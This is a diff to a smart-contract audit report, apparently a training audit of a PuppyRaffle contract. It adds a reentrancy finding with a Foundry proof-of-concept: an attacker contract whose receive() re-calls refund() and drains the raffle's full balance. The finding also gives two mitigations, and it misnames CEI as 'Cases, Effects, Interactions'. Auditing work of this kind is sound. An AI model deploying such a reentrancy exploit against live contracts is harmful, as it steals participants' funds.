@@ -9,9 +9,124 @@
 
 **Impact:** The reentrancy vulnerability could result in a significant drain on contract's balance, potentially leading to financial losses for the contract owner and participants.
 
-**Proof of Concept:**
+**Proof of Concept:** We set up an ReentrancyAttack contract with a malicious receive() function, have it enter PuppyRaffle with 4 other players and call refund() on it, with the following result,
 
-**Recommended Mitigation:** 
+- *puppyRaffle balance before attack: 5000000000000000000*
+- *attackContract balance before attack: 0*
+- *puppyRaffle balance after attack: 0*
+- *attackContract balance after attack: 5000000000000000000*
+
+<details>
+
+<summary>Code</summary>
+
+```javascript
+
+    function testReentrancyInRefundFunction() public playersEntered {
+        address alice = makeAddr("alice");
+        deal(alice, 1 ether);
+        vm.prank(alice);
+        ReentrancyAttacker attacker = new ReentrancyAttacker{value: 1 ether}(address(puppyRaffle));
+
+        address[] memory arr = new address[](1);
+        arr[0] = address(attacker);
+        
+        vm.prank(address(attacker));
+        puppyRaffle.enterRaffle{value:entranceFee}(arr);
+
+        console.log("puppyRaffle balance before attack: %s", address(puppyRaffle).balance);
+        console.log("attackContract balance before attack: %s", address(attacker).balance);
+
+        assertEq(address(puppyRaffle).balance, 5 ether);
+        assertEq(address(attacker).balance, 0);
+
+        vm.prank(alice);
+        attacker.setIdx();
+
+        vm.startPrank(address(attacker));
+        uint256 idx = puppyRaffle.getActivePlayerIndex(address(attacker));
+        puppyRaffle.refund(idx);
+        vm.stopPrank();
+
+        console.log("puppyRaffle balance after attack: %s", address(puppyRaffle).balance);
+        console.log("attackContract balance after attack: %s", address(attacker).balance);
+        assertEq(address(puppyRaffle).balance, 0);
+        assertEq(address(attacker).balance, 5 ether);
+
+    }
+
+    contract ReentrancyAttacker {
+        PuppyRaffle public raffle;
+        uint256 constant entranceFee = 1e18;
+        uint256 public idx;
+
+        address private owner;
+
+        modifier onlyOwner() {
+            require(msg.sender == owner, "You are not the owner");
+            _;
+        }
+
+        constructor(address _raffle) payable {
+            raffle = PuppyRaffle(_raffle);
+            owner = msg.sender;
+        }
+
+        function setIdx() external onlyOwner {
+            idx = raffle.getActivePlayerIndex(address(this));
+        }
+
+        receive() external payable {
+            if (address(raffle).balance > 0) {
+                raffle.refund(idx);
+            }
+        }
+    }
+
+```
+</details>
+
+
+**Recommended Mitigation:** You can go for one of the following counter measures,
+
+1. Follow the CEI (Cases, Effects, Interactions) pattern. For the  `PuppyRaffle::refund()`, cover the checks first. Set the states after that. Make external calls at the end.
+```diff
+
+    function refund(uint256 playerIndex) public {
++           // Checks
+            address playerAddress = players[playerIndex];
+            require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+            require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
++           // Effects
++           players[playerIndex] = address(0);
+
++           // External Calls
+            payable(msg.sender).sendValue(entranceFee);
+
+-           players[playerIndex] = address(0);
+            emit RaffleRefunded(playerAddress);
+        }
+
+```
+
+2. Consider using NonReentrant() modifier provided by OpenZeppelin contract.
+
+```diff
++   import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+-   contract PuppyRaffle {
++   contract PuppyRaffle is ReentrancyGuard {
+    // Rest of the code
+
+-    function refund(uint256 playerIndex) public {}
++    function refund(uint256 playerIndex) public nonReentrant {}
+
+    // Rest of the code
+    }
+
+```
+
 
 
 ### [M-01] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle()` function is a potential Denial-of-service (DoS) attack, incrementing gas costs for future players.
